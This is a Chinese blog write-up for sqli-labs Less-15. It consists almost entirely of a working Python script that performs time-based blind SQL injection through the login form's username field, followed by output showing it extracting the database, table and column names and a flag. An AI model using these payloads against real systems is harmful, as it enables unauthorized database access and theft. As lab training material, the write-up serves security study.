# 原创
：  less-15 in sqli-labs

# less-15 in sqli-labs

Less-15 延时注入【 ’ 】<br/> 自动注入脚本

```
import requests
import datetime
MAXLENGTH = 20

url = "http://sqli-labs:8080/Less-15/"

def getLengthOfDatabase():
    for num in range(1,MAXLENGTH):
        payload = "admin' and if(length(database())=%s,sleep(2),1)#" % num
        data = {'uname':payload, 'passwd':"1"}
        first_time = datetime.datetime.now()    # 获得payload提交前的时间
        res = requests.post(url, data=data)
        second_time = datetime.datetime.now()   # 获得payload提交后的时间
        diference_time = (second_time - first_time).seconds     # 时间差
        if diference_time &gt; 1:
            print("[+] 数据库的长度为 =&gt; {}".format(num))
            return num

def getNameOfDatabase(DATABASELENGTH):
    database_name = ""
    for i in range(1,DATABASELENGTH+1):
        for j in range(32,127):
            payload = "admin' and if(ascii(substr(database(),%s,1))=%s,sleep(2),1)#" % (i, j)
            data = {'uname':payload, 'passwd':"1"}
            first_time = datetime.datetime.now()
            res = requests.post(url, data=data)
            second_time = datetime.datetime.now()
            difference_time = (second_time - first_time).seconds
            if difference_time &gt; 1:
                database_name += chr(j)
        print("[+] 数据库名为 =&gt; " + database_name)
    return database_name

def getNumberOfTables():
    for num in range(1,MAXLENGTH):
        payload = "admin' and if((select count(*) from information_schema.tables where table_schema=database())=%s,sleep(2),1)#" % num
        data = {'uname': payload, 'passwd': "1"}
        first_time = datetime.datetime.now()
        res = requests.post(url, data=data)
        second_time = datetime.datetime.now()
        difference_time = (second_time - first_time).seconds
        if difference_time &gt; 1:
            print("[+] 数据库中表的数量为 =&gt; {}".format(num))
            return num

def getLengthOfAllTables(NUMBEROFTABLES):
    lengthofalltables_list = []
    for i in range(NUMBEROFTABLES):
        for num in range(1,MAXLENGTH):
            payload = "admin' and if(length((select table_name from information_schema.tables where table_schema=database() limit %s,1))=%s,sleep(2),1)#" % (i, num)
            data = {'uname': payload, 'passwd': "1"}
            first_time = datetime.datetime.now()
            res = requests.post(url, data=data)
            second_time = datetime.datetime.now()
            difference_time = (second_time - first_time).seconds
            if difference_time &gt; 1:
                print("[+] 第{}张表的长度为 =&gt; {}".format(i,num))
                lengthofalltables_list.append(num)
    print("[+] 所有表的长度为 =&gt; {}".format(lengthofalltables_list))
    return lengthofalltables_list

def getNameOfAllTables(NUMBEROFTABLES,LENGTHOFTABLE_LIST):
    nameofalltables_list = []
    for i in range(NUMBEROFTABLES):
        name = ""
        for j in range(1,LENGTHOFTABLE_LIST[i]+1):
            for k in range(32,127):
                payload = "admin' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %s,1),%s,1))=%s,sleep(2),1)#" % (i, j, k)
                data = {'uname': payload, 'passwd': "1"}
                first_time = datetime.datetime.now()
                res = requests.post(url, data=data)
                second_time = datetime.datetime.now()
                difference_time = (second_time - first_time).seconds
                if difference_time &gt; 1:
                    name = name + chr(k)
                    break
        nameofalltables_list.append(name)
        print("[+] 第{}张表的名字为 =&gt; {}".format(i+1,name))
    print("[+] 所有表的名字为 =&gt; {}".format(nameofalltables_list))
    return nameofalltables_list

def getNumberOfColumns(TABLE_TO_FIND):
    for num in range(1,MAXLENGTH):
        payload = "admin' and if((select count(*) from information_schema.columns where table_name='%s')=%s,sleep(2),1)#" % (TABLE_TO_FIND,num)
        data = {'uname': payload, 'passwd': "1"}
        first_time = datetime.datetime.now()
        res = requests.post(url, data=data)
        second_time = datetime.datetime.now()
        difference_time = (second_time - first_time).seconds
        if difference_time &gt; 1:
            print("[+] {}表中列的数量为 =&gt; {}".format(TABLE_TO_FIND,num))
            return num

def getLengthOfAllColmuns(NUMBEROFCOLUMNS,TABLE_TO_FIND):
    lengthofallcolumns_list = []
    for i in range(NUMBEROFCOLUMNS):
        for num in range(1,MAXLENGTH):
            payload = "admin' and if(length((select column_name from information_schema.columns where table_schema=database() and table_name='%s' limit %s,1))=%s,sleep(2),1)#" % (TABLE_TO_FIND,i,num)
            data = {'uname': payload, 'passwd': "1"}
            first_time = datetime.datetime.now()
            res = requests.post(url, data=data)
            second_time = datetime.datetime.now()
            difference_time = (second_time - first_time).seconds
            if difference_time &gt; 1:
                lengthofallcolumns_list.append(num)
    print("[+] {}表中列的长度分别为 =&gt; {}".format(TABLE_TO_FIND,lengthofallcolumns_list))
    return lengthofallcolumns_list

def getNameOfAllColumns(NUMBEROFTABLES,LENGTHOFCOLUMNS_LIST,TABLE_TO_FIND):
    nameofallcolumns_list = []
    for i in range(NUMBEROFCOLUMNS):
        name = ""
        for j in range(1,LENGTHOFCOLUMNS_LIST[i]+1):
            for k in range(32,127):
                payload = "admin' and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='%s' limit %s,1),%s,1))=%s,sleep(2),1)#" % (TABLE_TO_FIND,i,j,k)
                data = {'uname': payload, 'passwd': "1"}
                first_time = datetime.datetime.now()
                res = requests.post(url, data=data)
                second_time = datetime.datetime.now()
                difference_time = (second_time - first_time).seconds
                if difference_time &gt; 1:
                    name = name + chr(k)
                    break
        nameofallcolumns_list.append(name)
    print("[+] {}表中列名分别为 =&gt; {}".format(TABLE_TO_FIND,nameofallcolumns_list))
    return nameofallcolumns_list

def getData(TABLE_TO_FIND,COLUMN_TO_FIND):
    # 初始化flag的长度为1
    flag_length = 1
    flag = ""
    # 从1开始无限循环flag的长度直到找出
    while True:
        # flag中每一个字符的所有可能取值
        for k in range(32,127):
            payload = "admin' and if(ascii(substr((select %s from %s),%s,1))=%s,sleep(2),1)#" % (COLUMN_TO_FIND,TABLE_TO_FIND,flag_length,k)
            data = {'uname': payload, 'passwd': "1"}
            first_time = datetime.datetime.now()
            res = requests.post(url, data=data)
            second_time = datetime.datetime.now()
            difference_time = (second_time - first_time).seconds
            if difference_time &gt; 1:
                # 显示flag
                flag += chr(k)
                print("[+] " + flag)
                # flag终止条件，即flag的尾端右花括号
                if chr(k) == "}":
                    print()
                    return 1
                break
        # 如果没有匹配成功，flag长度加1，继续循环
        flag_length += 1

if __name__ == '__main__':
    print("Judging the length of the database...")
    DATABASELENGTH = getLengthOfDatabase()
    print("Judging the name of the database...")
    DATABASENAME = getNameOfDatabase(DATABASELENGTH)
    print("Judging the number of tables in the {}...".format(DATABASENAME))
    NUMBEROFTABLES = getNumberOfTables()
    print("Judging the length of every table in the {}...".format(DATABASENAME))
    LENGTHOFTABLE_LIST = getLengthOfAllTables(NUMBEROFTABLES)
    print("Judging the name of every table in the {}...".format(DATABASENAME))
    NAMEOFTABLE_LIST = getNameOfAllTables(NUMBEROFTABLES,LENGTHOFTABLE_LIST)
    for i in NAMEOFTABLE_LIST:
        print("[+]{}".format(i))
    TABLE_TO_FIND = input("Select the table name:")
    if TABLE_TO_FIND not in NAMEOFTABLE_LIST:
        print("Error!")
        exit()
    print()
    NUMBEROFCOLUMNS = getNumberOfColumns(TABLE_TO_FIND)
    print("Judging the number of columns in the {}...".format(TABLE_TO_FIND))
    print("Judging the length of every column in the {}...".format(TABLE_TO_FIND))
    LENGTHOFCOLUMNS_LIST = getLengthOfAllColmuns(NUMBEROFCOLUMNS,TABLE_TO_FIND)
    print("Judging the name of every column in the {}...".format(TABLE_TO_FIND))
    NAMEOFCOLUMNS_LIST = getNameOfAllColumns(NUMBEROFTABLES,LENGTHOFCOLUMNS_LIST,TABLE_TO_FIND)
    for i in NAMEOFCOLUMNS_LIST:
        print("[+]{}".format(i))
    COLUMN_TO_FIND = input("Select the column name:")
    if TABLE_TO_FIND not in NAMEOFTABLE_LIST:
        print("Error!")
        exit()
    print("Judging the data...")
    print("[+] The flag is...")
    getData(TABLE_TO_FIND,COLUMN_TO_FIND)

```

注入结果

```
D:\Pycharm\3.9\Scripts\python.exe D:/Pycharm/3.9/SQL注入/test2.py
Judging the length of the database...
[+] 数据库的长度为 =&gt; 8
Judging the name of the database...
[+] 数据库名为 =&gt; s
[+] 数据库名为 =&gt; se
[+] 数据库名为 =&gt; sec
[+] 数据库名为 =&gt; secu
[+] 数据库名为 =&gt; secur
[+] 数据库名为 =&gt; securi
[+] 数据库名为 =&gt; securit
[+] 数据库名为 =&gt; security
Judging the number of tables in the security...
[+] 数据库中表的数量为 =&gt; 5
Judging the length of every table in the security...
[+] 第0张表的长度为 =&gt; 6
[+] 第1张表的长度为 =&gt; 10
[+] 第2张表的长度为 =&gt; 8
[+] 第3张表的长度为 =&gt; 7
[+] 第4张表的长度为 =&gt; 5
[+] 所有表的长度为 =&gt; [6, 10, 8, 7, 5]
Judging the name of every table in the security...
[+] 第1张表的名字为 =&gt; emails
[+] 第2张表的名字为 =&gt; hermesflag
[+] 第3张表的名字为 =&gt; referers
[+] 第4张表的名字为 =&gt; uagents
[+] 第5张表的名字为 =&gt; users
[+] 所有表的名字为 =&gt; ['emails', 'hermesflag', 'referers', 'uagents', 'users']
[+]emails
[+]hermesflag
[+]referers
[+]uagents
[+]users
Select the table name:hermesflag

[+] hermesflag表中列的数量为 =&gt; 2
Judging the number of columns in the hermesflag...
Judging the length of every column in the hermesflag...
[+] hermesflag表中列的长度分别为 =&gt; [2, 4]
Judging the name of every column in the hermesflag...
[+] hermesflag表中列名分别为 =&gt; ['Id', 'flag']
[+]Id
[+]flag
Select the column name:flag
Judging the data...
[+] The flag is...
[+] f
[+] fl
[+] fla
[+] flag
[+] flag{
[+] flag{3
[+] flag{32
[+] flag{327
[+] flag{327a
[+] flag{327a6
[+] flag{327a6c
[+] flag{327a6c4
[+] flag{327a6c43
[+] flag{327a6c430
[+] flag{327a6c4304
[+] flag{327a6c4304a
[+] flag{327a6c4304ad
[+] flag{327a6c4304ad5
[+] flag{327a6c4304ad59
[+] flag{327a6c4304ad593
[+] flag{327a6c4304ad5938
[+] flag{327a6c4304ad5938e
[+] flag{327a6c4304ad5938ea
[+] flag{327a6c4304ad5938eaf
[+] flag{327a6c4304ad5938eaf0
[+] flag{327a6c4304ad5938eaf0e
[+] flag{327a6c4304ad5938eaf0ef
[+] flag{327a6c4304ad5938eaf0efb
[+] flag{327a6c4304ad5938eaf0efb6
[+] flag{327a6c4304ad5938eaf0efb6c
[+] flag{327a6c4304ad5938eaf0efb6cc
[+] flag{327a6c4304ad5938eaf0efb6cc3
[+] flag{327a6c4304ad5938eaf0efb6cc3e
[+] flag{327a6c4304ad5938eaf0efb6cc3e5
[+] flag{327a6c4304ad5938eaf0efb6cc3e53
[+] flag{327a6c4304ad5938eaf0efb6cc3e53d
[+] flag{327a6c4304ad5938eaf0efb6cc3e53dc
[+] flag{327a6c4304ad5938eaf0efb6cc3e53dc}

```
